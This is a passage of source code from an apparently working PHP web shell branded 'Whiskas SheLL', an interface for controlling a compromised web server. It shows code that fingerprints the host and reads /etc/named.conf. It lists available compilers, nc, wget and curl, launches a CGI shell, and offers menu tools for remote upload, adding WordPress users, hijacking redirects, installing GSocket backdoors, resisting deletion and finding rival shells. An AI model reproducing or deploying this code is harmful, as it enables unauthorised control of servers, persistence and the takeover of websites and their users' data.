o.multi_selector)r+=i+"{"+o.multi_selector[i].replace(/{color}/g,e.value)+"}";evalCss(r)}-1==l||t?($("input_"+a.replace(".","")).value=e.value,$("gui_"+a.replace(".","")).value=e.value,".header_values"==a&&(a=".header,.header_values"),d.querySelectorAll(a).forEach(function(a){a.style.color=e.value})):($("input_"+a.replace(".","")).value=e.value,$("gui_"+a.replace(".","")).value=e.value,evalCss(a+"{color: "+e.value+";}"))}function importConfig(e){var a=e.target,t=new FileReader;t.onload=function(){var e=t.result;try{reloadColors(JSON.parse(e))}catch(e){alert("Config is invalid...!")}$("importFileBtn").value=""},t.readAsText(a.files[0])}function checkBox(e){var a=WHISKAS_current_fm_id,t=e.checked;d.querySelectorAll("#filesman_holder_"+a+" form[name=files] input[type=checkbox]").forEach(function(e){e.checked=t})}function runcgi(e){if($("cgiframe").style.height="unset",d.querySelector("#cgiloader-minimized .minimized-text").innerHTML="Cgi Shell",d.querySelector("#cgiloader .opt-title").innerHTML="Cgi Shell",cgi_is_minimized&&cgi_lang==e&&(showEditor("cgiloader"),0==php_temrinal_using_cgi))return!1;php_temrinal_using_cgi=!1,_Ajax(d.URL,"a="+WHISKASb64("cgishell")+"&WHISKAS1="+WHISKASb64(e)+"&ajax="+WHISKASb64("true"),function(a){d.body.style.overflow="hidden",$("cgiloader").style.display="block",d.querySelector("#cgiframe .terminal-tabs").innerHTML="",d.querySelector("#cgiframe .terminal-contents").innerHTML=a,cgi_lang=e,cgi_is_minimized&&($("cgiloader-minimized").setAttribute("class","minimized-hide"),setTimeout(function(){$("cgiloader").removeAttribute("class"),is_minimized&&($("editor-minimized").style.top="30%")},1e3))})}Element.prototype.appendAfter=function(e){e.parentNode.insertBefore(this,e.nextSibling)};
</script>
<?php echo"<form style='display:none;' id='dlForm' action='' target='_blank' method='post'>
<input type='hidden' name='a' value='dlfile'>
<input type='hidden' name='c' value=''>
<input type='hidden' name='file' value=''>
</form>
<input type='file' style='display:none;' id='importFileBtn' onchange='importConfig(event);'>
<div id='a_loader'><img src='".__showicon('loader')."'></div>";
$cmd_uname = WHISKASEx("uname -a",false,false);
$uname = function_exists('php_uname') ? substr(@php_uname(), 0, 120) : (strlen($cmd_uname)>0?$cmd_uname:'( php_uname ) Function Disabled !');
if($uname=="( php_uname ) Function Disabled !"){$GLOBALS["need_to_update_header"]="true";}
echo '
</head>
<body bgcolor="#000000" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0" style="background:url(https://wallpapercave.com/wp/wp2730030.gif) center/cover no-repeat fixed #000;">
<div id="up_bar_holder"></div>
<div class="whole">
<form method="post" name="mf" style="display:none;">
<input type="hidden" name="a">
<input type="hidden" name="c" value="'.$GLOBALS['cwd'].'">';
for($s=1;$s<=10;$s++){
echo '<input type="hidden" name="WHISKAS'.$s.'">';
}
echo '<input type="hidden" name="charset">
</form>
<div id=\'hidden_sh\'><a class="alert_green" target="_blank" href="?WHISKAS"><span style="color:#FF0000;font-weight:bold;">'.__WHISKAS_CODE_NAME__.'</span><br><small>Version: <span class="hidden_shell_version">'.__WHISKAS_VERSION__.'</span></small></a></div>
<div class="header"><table width="100%" border="0">
<tr>
<td width="3%"><span class="header_vars">Uname:</span></td>
<td colspan="2"><span class="header_values" id="header_uname">'.$uname.'</span></td>
</tr>
<tr>
<td><span class="header_vars">User:</span></td>
<td><span class="header_values" id="header_userid">'. $uid . ' [ ' . $user . ' ] </span><span class="header_vars"> Group: </span><span class="header_values" id="header_groupid">' . $gid . ' [ ' . $group . ' ]</span> </td>
<td width="12%" rowspan="8" style="text-align:center;vertical-align:middle;"><img style="border-radius:50%;" width="200" height="200" alt="Whiskas SheLL" draggable="false" src="https://storage.dk-only.site/shell-assest/dk-profile.png" /><br><a href="https://t.me/kvnzlx8" target="_blank" style="text-decoration:none;"><font style="font-size:10.5px;font-weight:bold;letter-spacing:5px;color:#FFFFFF;text-shadow:0 0 5.5px #FFFFFF, 0 0 10.5px #FFFFFFff;">WELCOME D</font></a></td>
</tr>
<tr>
<td><span class="header_vars">PHP:</span></td>
<td><b>'.@phpversion(). ' </b><span class="header_vars"> Safe Mode: '.$safe_modes.'</span></td>
</tr>
<tr>
<td><span class="header_vars">ServerIP:</span></td>
<td><b>'.(!@$_SERVER["SERVER_ADDR"]?(function_exists("gethostbyname")?@gethostbyname($_SERVER['SERVER_NAME']):'????'):@$_SERVER["SERVER_ADDR"]).'</b><div style="display:inline;display:none;" class="flag-holder"></div> <span class="header_vars">Your IP:</span><b> '.@$_SERVER["REMOTE_ADDR"].'</b><div style="display:inline;display:none;" class="flag-holder"></div></td>
</tr>
<tr>
<td width="3%"><span class="header_vars">DateTime:</span></td>
<td colspan="2"><b>'.date('Y-m-d H:i:s').'</b></td>
</tr>
<tr>
<td><span class="header_vars">Domains:</span></td>
<td width="76%"><span class="header_values" id="header_domains">';
if($GLOBALS['sys']=='unix'){
$d0mains = _WHISKAS_file("/etc/named.conf",false);
if(!$d0mains){echo "Cant Read [ /etc/named.conf ]";$GLOBALS["need_to_update_header"]="true";}else{
$count=0;
foreach($d0mains as $d0main){
if(@strstr($d0main,"zone")){
preg_match_all('#zone "(.*)"#', $d0main, $domains);
flush();
if(strlen(trim($domains[1][0])) > 2){
flush();
$count++;}}}
echo "$count Domains";}}
else{echo("Cant Read [ /etc/named.conf ]");}
echo '</span></td>
</tr>
<tr>
<td height="16"><span class="header_vars">HDD:</span></td>
<td><span class="header_vars">Total:</span><b>'.WHISKASSize($totalSpace).' </b><span class="header_vars">Free:</span><b>' . WHISKASSize($freeSpace) . ' ['. (int) ($freeSpace/$totalSpace*100) . '%]</b></td>
</tr>';
if($GLOBALS['sys']=='unix'){
$useful_downloader = '<tr><td height="18" colspan="2"><span class="header_vars">useful:</span><span class="header_values" id="header_useful">--------------</span></td></tr><td height="0" colspan="2"><span class="header_vars">Downloader: </span><span class="header_values" id="header_downloader">--------------</span></td></tr>';
if(!@ini_get('safe_mode')){
if(strlen(WHISKASEx("id",false,false))>0){
echo '<tr><td height="18" colspan="2"><span class="header_vars">Useful : </span>';
$userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bziWHISKAS2','nc','locate','suidperl');
$x=0;
foreach($userful as $item)if(WHISKASWhich($item)){$x++;echo '<span class="header_values" style="margin-left: 4px;">'.$item.'</span>';}
if($x==0){echo "<span class='header_values' id='header_useful'>Whiskas</span>";$GLOBALS["need_to_update_header"] = "true";}
echo '</td>
</tr>
<tr>
<td height="0" colspan="2"><span class="header_vars">Downloader: </span>';
$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
$x=0;
foreach($downloaders as $item2)if(WHISKASWhich($item2)){$x++;echo '<span class="header_values" style="margin-left: 4px;">'.$item2.'</span>';}
if($x==0){echo "<span class='header_values' id='header_downloader'>--------------</span>";$GLOBALS["need_to_update_header"] = "true";}
echo '</td>
</tr>';
}else{
echo $useful_downloader;$GLOBALS["need_to_update_header"] = "true";
}
}else{
echo $useful_downloader;$GLOBALS["need_to_update_header"] = "true";
}
}else{
echo '<tr><td height="18" colspan="2"><span class="header_vars">Windows:</span><b>';
echo WHISKASEx('ver',false,false);
echo '</td>
</tr> <tr>
<td height="0" colspan="2"><span class="header_vars">Downloader: </span><b>-------------</b></td>
</tr></b>';
}
$quotes = (function_exists('get_magic_quotes_gpc')?get_magic_quotes_gpc():'0');if ($quotes == "1" or $quotes == "on"){$magic = '<b><span class="header_on">ON</span>';}else{$magic = '<span class="header_off">OFF</span>';}
echo '<tr>
<td height="16" colspan="2"><span class="header_vars">Disable Functions: </span><b>'.WHISKAS_GetDisable_Function().'</b></td>
</tr>
<tr>
<td height="16" colspan="2"><span class="header_vars">CURL :</span>'.$curl.' | <span class="header_vars">SSH2 : </span>'.$ssh2.' | <span class="header_vars">Magic Quotes : </span>'.$magic.' | <span class="header_vars"> MySQL :</span>'.$mysql.' | <span class="header_vars">MSSQL :</span>'.$mssql.' | <span class="header_vars"> PostgreSQL :</span>'.$pg.' | <span class="header_vars"> Oracle :</span>'.$or.' '.($GLOBALS['sys']=="unix"?'| <span class="header_vars"> CGI :</span> '.$cgi_shell:"").'</td>
</tr>
<tr>
<td height="11" colspan="3"><span class="header_vars">Open_basedir :</span><b>'.$open_b.'</b> | <span class="header_vars">Safe_mode_exec_dir :</span><b>'.$safe_exe.'</b> | <span class="header_vars"> Safe_mode_include_dir :</span></b>'.$safe_include.'</b></td>
</tr>
<tr>
<td height="11"><span class="header_vars">SoftWare: </span></td>
<td colspan="2"><b>'.@getenv('SERVER_SOFTWARE').'</b></td>
</tr>';
if($GLOBALS['sys']=="win"){
echo '<tr>
<td height="12"><span class="header_vars">DRIVE:</span></td>
<td colspan="2"><b>'.$drives.'</b></td>
</tr>';
}
echo '<tr>
<td height="12"><span class="header_vars">PWD:</span></td>
<td colspan="2"><span id="header_cwd">'.$cwd_links.' </span><a href="#action=fileman&path='.$GLOBALS['home_cwd'].'" onclick="g(\'FilesMan\',\'' . $GLOBALS['home_cwd'] . '\',\'\',\'\',\'\')"><span class="home_shell">[ Back To Access Bro !! ]</span> </a></td>
</tr>
</table>
</div>
<div id="meunlist">
<ul>
';
$li = array(
    'ziper'=>'Compressor',
    'remotedl'=>'Remote Upload',
    'findmtime'=>'Find Modified Files',
    'wp_adduser'=>'WP User Manager',
    'redirect_manager'=>'Redirect Manager',
    'gsocket_install'=>'GSocket Install',
    'defense_shell'=>'Defense Shell',
    'antidelete'=>'Anti-Delete',
    'shell_finder'=>'Shell Finder'
);
foreach($li as $key=>$value){
echo('<li><a id="menu_opt_'.$key.'" href="#action=options&path='.$GLOBALS['cwd'].'&opt='.$key.'" class="menu_options" onclick="WHISKAS_can_add_opt=true;this.href=\'#action=options&path=\'+c_+\'&opt='.$key.'\';g(\''.$key.'\',null,\'\',\'\',\'\');d.querySelector(\'.opt-title\').innerHTML=this.innerHTML;">'.$value.'</a></li>'."\n");
}
echo '</ul><div style="text-align: center;padding: 6px;"><a id="menu_opt_settings" href="#action=options&path='.$GLOBALS['cwd'].'&opt=settings" class="menu_options" onclick="WHISKAS_can_add_opt=true;this.href=\'#action=options&path=\'+c_+\'&opt=settings\';g(\'settings\',null,\'\',\'\',\'\');d.querySelector(\'.opt-title\').innerHTML=this.innerHTML;">Shell Settings</a> <a href="?logout" style="text-decoration:none;"><font color="#ff4444">LogOut</font></a></div></div><div id="filesman_tabs"><div onmouseover="WHISKASFilesmanTabShowTitle(this,event);" onmouseout="WHISKASFilesmanTabHideTitle(this,event);" fm_counter="1" path="'.$GLOBALS['cwd'].'" fm_id="1" id="filesman_tab_1" class="filesman_tab filesman-tab-active" onclick="filesmanTabController(this);"><img class="folder-tab-icon" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAgAAAAIACAYAAAD0eNT6AAAgAElEQVR4Xu3de4ylZ30f8N/znjO3vWGnkAA2JkvsQjG1je3COoBkh0hUtEDAdCWSqBVqokiNqlaq1ET0D++mLVGgIC7hagiYiwnrG7cSjL2wCk1IMVvf79i7vgHGxvb6smvvzDlPdQYvWe9tZo53nveceT4jRYgw73ne5/N7fjO/fb8zZ1L4IECAAAECBKoTSNXt2IYJECBAgACBMAA4BAQIECBAoEIBA0CFRbdlAgQIECBgAHAGCBAgQIBAhQIGgAqLbssECBAgQMAA4AwQIECAAIEKBQwAFRbdlgkQIECAgAHAGSBAgAABAhUKGAAqLLotEyBAgAABA4AzQIAAAQIEKhQwAFRYdFsmQIAAAQIGAGeAAAECBAhUKGAAqLDotkyAAAECBAwAzgABAgQIEKhQwABQYdFtmQABAgQIGACcAQIECBAgUKGAAaDCotsyAQIECBAwADgDBAgQIECgQgEDQIVFt2UCBAgQIGAAcAYIECBAgECFAgaACotuywQIECBAwADgDBAgQIAAgQoFDAAVFt2WCRAgQICAAcAZIECAAAECFQoYACosui0TIECAAAEDgDNAgAABAgQqFDAAVFh0WyZAgAABAgYAZ4AAAQIECFQoYACosOi2TIAAAQIEDADOAAECBAgQqFDAAFBh0W2ZAAECBAgYAJwBAgQIECBQoYABoMKi2zIBAgQIEDAAOAMECBAgQKBCAQNAhUW3ZQIECBAgYABwBggQIECAQIUCBoAKi27LBAgQIEDAAOAMECBAgACBCgUMABUW3ZYJECBAgIABwBkgQIAAAQIVChgAKiy6LRMgQIAAAQOAM0CAAAECBCoUMABUWHRbJkCAAAECBgBngAABAgQIVChgAKiw6LZMgAABAgQMAM4AAQIECBCoUMAAUGHRbZkAAQIECBgAnAECBAgQIFChgAGgwqLbMgECBAgQMAA4AwQIECBAoEIBA0CFRbdlAgQIECBgAHAGCBAgQIBAhQIGgAqLbssECBAgQMAA4AwQIECAAIEKBQwAFRbdlgkQIECAgAHAGSBAgAABAhUKGAAqLLotEyBAgAABA4AzQIAAAQIEKhQwAFRYdFsmQIAAAQIGAGeAAAECBAhUKDDWA8BPLz9ldd7dPK/f5GP37k3PyU1a10Rek1JMVFhLWy4o0IuUOzl2R8q7mpR3zTZ5V+o3969/6zWPFLwNSxEgQGBogbEbAO7ZcvKvzDWdk1LTnBg5vTSlOCFyHJtTrIsc63LE2hQGgKFPhAsXKZD7EWlP5NgVEbtyil0p5XtyjptSP27LeeLOnc9b/eA552ybW+QL+jQCBAgUFRibAeD+r77i1/bMds+IJn4z+un0iDgpUhwXETNFxSxG4DACOcdsSnFfyum2iHxLbvIPotv/+xc/+dK708aLeuAIECAwSgIjPwD8+OtnPHf2yf6p0cTrI8Xrc8TLBv/SHyVE90LgEAJP5YgdTY5tkWLrk73+91+68dr7SBEgQGBUBEZ6ANj5tVPWx1zz9sjx5oh0ckQcOypw7oPAIgV2R8TtKfLluZe+8uBMc+2Zb9o++P/5IECAQKsCIzsA3LnllJemTuedkeMd8zm/DwLjLfBwRHw/In+xmyYvP/5tP/j5eG/H3RMgMO4CIzkA3HPxGa/upd4fRaR/GREvGHdk90/gaYFepLg+99PnJrudi4/7navuIUOAAIG2BEZuANhxyekbIuc/TRFviBTTbcFYl8DyCeQ7+5E+Ox3xuReee/Vdy7eOVyZAgMDhBUZqALhryytfnjvxpznyxhRpSuEIrGCBnSnFZ3o5LniJIWAFl9nWCIyuwMgMAPdsOfW4Xif9h4j0BxHxq6NL5s4IHDWBHSnHZ3vJEHDURL0QAQKLFhiJAeCeLWfN9LtP/psc8SeR4+WLvnufSGD8BXZExGcmJpoLjnvz9rvHfzt2QIDAuAiMxABw58Wnn9JJ+V39HG/zNr7jcnTc51ETyHlHpPRXvV7zud/YaAg4aq5eiACBIwq0PgDsuOy0Y1Iv/jCl9J9yzL+znw8CFQrkOyPSZwwBFZbelgm0JND6AHDXpae+NvebTYN3+WvJwLIERkQg3xm5+auJbudzfkVwREriNgisYIFWB4D8wzMm7r6r98c50rsi4nkr2NnWCCxSYPAkID4915n7/Im/c4P3CVikmk8jQGDpAq0OAHd/9ZUv7M3l81KkP4yIVu9l6XSuILBsAnekyJ+e3Tv3hRPfYQhYNmUvTKBygVa/6d6x5dTXdjrNeRHx25XXwfYJHChwR4786Ynof/74c6+7Fw8BAgSOtkCrA8COS09/Z/TzJu/1f7TL6vVWiMAdKcenOqn3BUPACqmobRAYIYHWBoBB/r/zrt5/i5ze5Vf/RuhEuJWREkgRP4oUn9qbe188yZOAkaqNmyEw7gKtDQD3fOvkX+k9MbkpIv7juCO6fwLLKpDjRznHp7q5/4UXbbz2vmVdy4sTIFCNQGsDwM6vnbI+z3Y2pYh/W422jRIYUiBF3B6RPtX0el80BAyJ6DICBJ4h0NoAcO9lp53W66VNOcVb1IQAgYUFBkNAzvn8ZiJ98YS3XP3jha/wGQQIEDi8QGsDwF1bTn1tdJrzst8AcD4JLFogR9yeUv5k00kXGgIWzeYTCRA4hEBrA8COi047O6U4L1I6W2UIEFiSwG3Rz+c3c+nCE97hScCS5HwyAQK/FDAAOAwExlPgtoj4ZERz4a+fu/0n47kFd02AQJsCBoA29a1N4FkI5IjbUo5PRGq+ZAh4FpAuJVCpgAGg0sLb9goRSPnW6KdPGgJWSD1tg0BBAQNAQWxLEVgWgZxvzdF8IvqdL63feNVPl2UNL0qAwIoTMACsuJLaUI0COedbm9R8vN/r/LUhoMYTYM8Eli5gAFi6mSsIjKrALSnnj/f7e7+8fuNNngSMapXcF4ERETAAjEgh3AaBoyRwS87543li7q9f8pYb7j9Kr+llCBBYgQIGgBVYVFuqWyDnuKVp4mO9zuyXDQF1nwW7J3AkAQOA80FgZQrcnCI+1ntqdstLfteTgJVZYrsi8OwEDADPzs/VBEZZ4OZ+xMf6qfflE9923c9G+UbdGwEC5QUMAOXNrUignECKm6KfPjbXzG0xBJRjtxKBcRAwAIxDldwjgWcjMBgCIn10ajpvecEbr37g2byUawkQWDkCBoCVU0s7IXB4gRw3NSl/ZKKXLnrBRkOAo0KAQIQBwCkgUIlAirgxR/7obC9ddJIhoJKq2yaBwwsYAJwOAnUJ3JhzfGRqqrnohW/a/mBdW7dbAgT2FzAAOA8E6hO4sUnxl92J5mJDQH3Ft2MC+wQMAM4CgQoFUqQb+jl/ZO/e5uKX/q4nARUeAVsm4GcAnAEC9QrkG3I0fzmRuhcf/7Yf/LxeBzsnUKeAJwB11t2uCTwtkG9Iuflwp+leYghwKAjUJWAAqKvedkvgIIGU4vqI/OHd8eSl/+xtt3gS4IwQqETAAFBJoW2TwJEEco7rm8gfbvqzl7xo440P0SJAYOULGABWfo3tkMCiBAZDQEr5Q53e7KWGgEWR+SQCYy1gABjr8rl5Akdd4LqI+NATvb2XnexJwFHH9YIERknAADBK1XAvBEZAIEdclyI+lKbmLn3xv77+4RG4JbdAgMAyCBgAlgHVSxJYAQLXRo4PpafmLnvx7xkCVkA9bYHAQQIGAIeCAIHDCVybU/pgpP5l6996zSOYCBBYWQIGgJVVT7shcFQFcsS1ncgf6DXxFUPAUaX1YgRaFzAAtF4CN0BgxAVSXJOj/6Fmsv8VPxMw4rVyewSWIGAAWAKWTyVQscC1kdOnOv3eZS/aeO19FTvYOoEVI2AAWDGltBECyyuQIm6PFF+Kbn/LAz/p3nbmH22fXd4VvToBAsspYABYTl2vTWDlCfwkRbo8R3wt9zrfX7/xqp+uvC3aEYE6BAwAddTZLgkcNYEU8XjOcWtOcWVOeWtvLl1z0sarHzhqC3ghAgSKCBgAijBbhMCKFBj8auCNEfHd3M8/7OXm3ulud+dxb/3BQylFXpE7tikCK0jAALCCimkrBNoRyIM/HnRXjnRvitiZI98ZKf009WJXRN6VUt4Vqb+nv7fTb+f+rLpSBDqr0t7dsfux6566dffGjdFbKftqax8GgLbkrUtgZQrkSPFI5Lj/F9/8B0NA2hU59kRkA8DKrHmxXeUcs5HSoxExf7b6/Xig2+nfEbNzPzp+440Pp/DkaSnFMAAsRcvnEiBAgMAoCAx+A+XxSOln0R88cYqbIuLm6OSbO3tnb/HXLBdXIgPA4px8FgECBAiMqMAvngzE4DdSbkkRfxsptvbmmpt+Y+P2XSN6yyNxWwaAkSiDmyBAgACBoyTwsxRxdU5pa0R848Vv/X+3phTip0PgGgCO0onzMgQIECAwUgI/iYhvNp10Qe/hh65a/86dT47U3Y3AzRgARqAIboEAAQIElkMgP5ZzfD81zSee7Dxxxcvecutjy7HKuL6mAWBcK+e+CRAgQGAxAv0Usb2f4v0zq3tff/4brntiMRfV8DkGgBqqbI8ECBCoXSDHD/vRf+/0VPcbL3zT9t21cwz2bwBwCggQIECgFoG/yym/d2qic4UhwABQy6G3TwIECBCI2BsR32ki/vxF5179vdrfOMgTAC1BgAABAhUJ5MdSxKc70X/f8eded29FGz9oqwaAmqtv7wQIEKhQIOe4von+/zjhnxx7aTpn21yFBPNbNgDUWnn7JkCAQL0Ce1Lkz6em854T3rr9jloZDAC1Vt6+CRAgULNAjpv60d/8krdfu6VWBgNArZW3bwIECNQtsCel+GDsmXvPi3/v+odrpDAA1Fh1eyZAgACBiMj/u+mmTSe85eof1shhAKix6vZMgAABAoOfgrstct786+dec2GNHAaAGqtuzwQIECAQKcXufj/++wU3XP2eTZvq+4uBBgBNQIAAAQLVCqSIP98789jmk974o6dqQzAA1FZx+yVAgACBfxRI8f7Z3ZObT/r9//tobSwGgNoqbr8ECBAgsJ9A+uhUL296wcarH6iNxQBQW8XtlwABAgT2F/h0N3qbanxbYAOARiBAgACBagVS5M/298bm9e+4ZmdtCAaA2ipuvwQIECDwSwEDQAuHYcdFp52dUpwXKZ3dwvKWJECAAAECYQBo4RAYAFpAtyQBAgQIPEPAANDCgTAAtIBuSQIECBAwADwt4GcANAMBAgQIVCvgCUALpfcEoAV0SxIgQICAJwCeAAzfBZ0mRbfbiU6niaZJkVKKwaOUwX/6IECAAIHxEeh2m2ump7vbuqnZdcS7TqkXKZ6KHE9FyoP/fCJyc0/00m0x/dAD6czts+Oz61/caWvfscbtCUCnaWJiohMT3SYmup35AaDbbaIZfPOf/z8DwLgdfvdLgACBJQj0IvLeiDT4mwFPRYrHI8c9kfPtEfnmSM0N0d17Qzrzez9Zwmu2+qkGgAX4B//Cn5zoxPTURExPTsx/0x/8y98HAQIECBB4WuDByPm2SOnvIvKV0etek17z7Z+Nuo4B4AgVGvxLf9XMxPw3/8mJ7vzjfh8ECBAgQOAwAoMY4abIeWtE51uRutenDX8zsn9kqLXvaKMcAQwe5w++4a9ZNRUz0xP+xa/XCRAgQGApAj+PFFdFzlsi0jfThq33L+XiUp9rADhAepDnz0xNxJrVUzE11Z3P+H0QIECAAIElCsxFzrdESp+N6H05bdh27xKvX/ZPb+272yg+AZj/5j89EevWTMfUZHfZ8S1AgAABAitdIP8ocjo/es0X0muv+PEo7dYA8HQ1BhAz05Oxbq1v/qN0QN0LAQIEVoDAbRHxvtjTuzCds+3xUdmPAeDpSgz+xf+ctTPzTwB8ECBAgACBoyqQ4nuR4t3RPLJ1VN4zwAAQMf/7/YPH/qumJ/2k/1E98V6MAAECBJ4W2BMRX42m9xfpVduuGQWV6geAwbv6rV0zPf9Df4M3+/FBgAABAgSWRSDlByKnj0fER0bhNwOqHwAGj/wHj/790N+yHHcvSoAAAQL7C+S4Kpr4s/ibrd9Mm6LfJk7VA0C308z/0N/qVVN+3a/NU2htAgQI1CPwWOR0QcTc+9JZ23a2ue2qB4BVM5NxzNqZ+Z8B8EGAAAECBAoJ3BgRm9KGrRcXWu+Qy1Q7AAze4Gfwr//BD//5K35tHkFrEyBAoDqB3ZHjAzGR3pPOvPLIf4VwGWmqHQAGf+BnkP0PngL4IECAAAEChQW+Er3e5vSa9n4joNoBwOP/wkfdcgQIECDwjwI53xCp2ZQ2XHlJWyzVDgCDR/+DJwD+wl9bR8+6BAgQqFgg58cixZ/Ft77z/rZ+G6DaAeCYdTPzA4APAgQIECDQikCK98Z0Z3M69dtPtLF+lQPA4If+BgPA4CmADwIECBAg0JLAJ2Ou2dzWHwmqcgAYPPYfDABrVxsAWjr0liVAgACBiC9HTpvTWVfe3AZGlQNAp9PM//7/4O1/fRAgQIAAgZYELo9Igx8E/Ic21q9yABi8A+Bz1s3EmlUGgDYOnTUJECBAYF5gW+Te5nTWtm1teBgA2lC3JgECBAgQMACks0ufAk8ASotbjwABAgQOIeAJQOljYQAoLW49AgQIEDAAPC2w46LTzk4pzovkCYC2IECAAIEqBTwBKF12TwBKi1uPAAECBDwB8ARAFxAgQIAAgYGAJwClz4EnAKXFrUeAAAECngB4AqALCBAgQICAJwB+CFAXECBAgEClAiKA0oUXAZQWtx4BAgQIiABEALqAAAECBAiIAEQAuoAAAQIEKhUQAZQuvAigtLj1CBAgQEAEIALQBQQIECBAQAQgAtAFBAgQIFCpgAigdOFFAKXFrUeAAAECIgARgC4gQIAAAQIiABGALiBAgACBSgVEAKULLwIoLW49AgQIEBABiAB0AQECBAgQEAGIAHQBAQIECFQqIAIoXXgRQGlx6xEgQICACEAEoAsIECBAgIAIQASgCwgQIECgUgERQOnCiwBKi1uPAAECBEQAIgBdQIAAAQIERAAiAF1AgAABApUKiABKF14EUFrcegQIECAgAhAB6AICBAgQICACEAHoAgIECBCoVEAEULrwIoDS4tYjQIAAARGACEAXECBAgAABEYAIQBcQIECAQKUCIoDShRcBlBa3HgECBAiIAEQAuoAAAQIECIgARAC6gAABAgQqFRABlC68CKC0uPUIECBAQAQgAtAFBAgQIEBABCAC0AUECBAgUKmACKB04UUApcWtR4AAAQIiABGALiBAgAABAiIAEYAuIECAAIFKBUQApQsvAigtbj0CBAgQEAGIAHQBAQIECBAQAYgAdAEBAgQIVCogAihdeBFAaXHrESBAgIAIQASgCwgQIECAgAhABKALCBAgQKBSARFA6cKLAEqLW48AAQIERAAiAF1AgAABAgREACIAXUCAAAEClQqIAEoXXgRQWtx6BAgQICACEAHoAgIECBAgIAIQAegCAgQIEKhUQARQuvAigNLi1iNAgAABEYAIQBcQIECAAAERgAhAFxAgQIBApQIigNKFFwGUFrceAQIECIgARAC6gAABAgQIiABEALqAAAECBCoVEAGULrwIoLS49QgQIEBABCAC0AUECBAgQEAEIALQBQQIECBQqYAIoHThRQClxa1HgAABAiIAEYAuIECAAAECIgARgC4gQIAAgUoFRAClCy8CKC1uPQIECBAQAYgAdAEBAgQIEBABiAB0AQECBAhUKiACKF14EUBpcesRIECAgAhABKALCBAgQICACEAEoAsIECBAoFIBEUDpwosASotbjwABAgREACIAXUCAAAECBEQAIgBdQIAAAQKVCogAShdeBFBa3HoECBAgIAIQAegCAgQIECAgAhAB6AICBAgQqFRABFC68CKA0uLWI0CAAAERgAhAFxAgQIAAARGACEAXECBAgEClAiKA0oUXAZQWtx4BAgQIiABEALqAAAECBAiIAEQAuoAAAQIEKhUQAZQuvAigtLj1CBAgQEAEIALQBQQIECBAQAQgAtAFBAgQIFCpgAigdOFFAKXFrUeAAAECIgARgC4gQIAAAQIiABGALiBAgACBSgVEAKULLwIoLW49AgQIEBABiAB0AQECBAgQEAGIAHQBAQIECFQqIAIoXXgRQGlx6xEgQICACEAEoAsIECBAgIAIQASgCwgQIECgUgERQOnCiwBKi1uPAAECBEQAIgBdQIAAAQIERAAiAF1AgAABApUKiABKF14EUFrcegQIECAgAhAB6AICBAgQICACEAHoAgIECBCoVEAEULrwIoDS4tYjQIAAARGACEAXECBAgAABEYAIQBcQIECAQKUCIoDShRcBlBa3HgECBAiIAEQAuoAAAQIECIgARAC6gAABAgQqFRABlC68CKC0uPUIECBAQAQgAtAFBAgQIEBABCAC0AUECBAgUKmACKB04UUApcWtR4AAAQIiABGALiBAgAABAiIAEYAuIECAAIFKBUQApQsvAigtbj0CBAgQEAGIAHQBAQIECBAQAYgAdAEBAgQIVCogAihdeBFAaXHrESBAgIAIQASgCwgQIECAgAhABKALCBAgQKBSARFA6cKLAEqLW48AAQIERAAiAF1AgAABAgREACIAXUCAAAEClQqIAEoXXgRQWtx6BAgQICACEAHoAgIECBAgIAIQAegCAgQIEKhUQARQuvAigNLi1iNAgAABEYAIQBcQIECAAAERgAhAFxAgQIBApQIigNKFFwGUFrceAQIECIgARAC6gAABAgQIiABEALqAAAECBCoVEAGULrwIoLS49QgQIEBABCAC0AUECBAgQEAEIALQBQQIECBQqYAIoHThRQClxa1HgAABAiIAEYAuIECAAAECIgARgC4gQIAAgUoFRAClCy8CKC1uPQIECBAQAYgAdAEBAgQIEBABiAB0AQECBAhUKiACKF14EUBpcesRIECAgAhABKALCBAgQICACEAEoAsIECBAoFIBEUDpwosASotbjwABAgREACIAXUCAAAECBEQAIgBdQIAAAQKVCogAShdeBFBa3HoECBAgIAIQAegCAgQIECAgAhAB6AICBAgQqFRABFC68CKA0uLWI0CAAAERgAhAFxAgQIAAARGACEAXECBAgEClAiKA0oUXAZQWtx4BAgQIiABEALqAAAECBAiIAEQAuoAAAQIEKhUQAZQuvAigtLj1CBAgQEAEIALQBQQIECBAQAQgAtAFBAgQIFCpgAigdOFFAKXFrUeAAAECIgARgC4gQIAAAQIiABGALiBAgACBSgVEAKULLwIoLW49AgQIEBABiAB0AQECBAgQEAGIAHQBAQIECFQqIAIoXXgRQGlx6xEgQICACEAEoAsIECBAgIAIQASgCwgQIECgUgERQOnCiwBKi1uPAAECBEQAIgBdQIAAAQIERAAiAF1AgAABApUKiABKF14EUFrcegQIECAgAhAB6AICBAgQICACEAHoAgIECBCoVEAEULrwIoDS4tYjQIAAARGACEAXECBAgAABEYAIQBcQIECAQKUCIoDShRcBlBa3HgECBAiIAEQAuoAAAQIECIgARAC6gAABAgQqFRABlC68CKC0uPUIECBAQAQgAtAFBAgQIEBABCAC0AUECBAgUKmACKB04UUApcWtR4AAAQIiABGALiBAgAABAiIAEYAuIECAAIFKBUQApQsvAigtbj0CBAgQEAGIAHQBAQIECBAQAYgAdAEBAgQIVCogAihdeBFAaXHrESBAgIAIQASgCwgQIECAgAhABKALCBAgQKBSARFA6cKLAEqLW48AAQIERAAiAF1AgAABAgREACIAXUCAAAEClQqIAEoXXgRQWtx6BAgQICACEAHoAgIECBAgIAIQAegCAgQIEKhUQARQuvAigNLi1iNAgAABEYAIQBcQIECAAAERgAhAFxAgQIBApQIigNKFFwGUFrceAQIECIgARAC6gAABAgQIiABEALqAAAECBCoVEAGULrwIoLS49QgQIEBABCAC0AUECBAgQEAEIALQBQQIECBQqYAIoHThRQClxa1HgAABAiIAEYAuIECAAAECIgARgC4gQIAAgUoFRAClCy8CKC1uPQIECBAQAYgAdAEBAgQIEBABiAB0AQECBAhUKiACKF14EUBpcesRIECAgAhABKALCBAgQICACEAEoAsIECBAoFIBEUDpwosASotbjwABAgREACIAXUCAAAECBEQAIgBdQIAAAQKVCogAShdeBFBa3HoECBAgIAIQAegCAgQIECAgAhAB6AICBAgQqFRABFC68CKA0uLWI0CAAAERgAhAFxAgQIAAARGACEAXECBAgEClAiKA0oUXAZQWtx4BAgQIiABEALqAAAECBAiIAEQAuoAAAQIEKhUQAZQuvAigt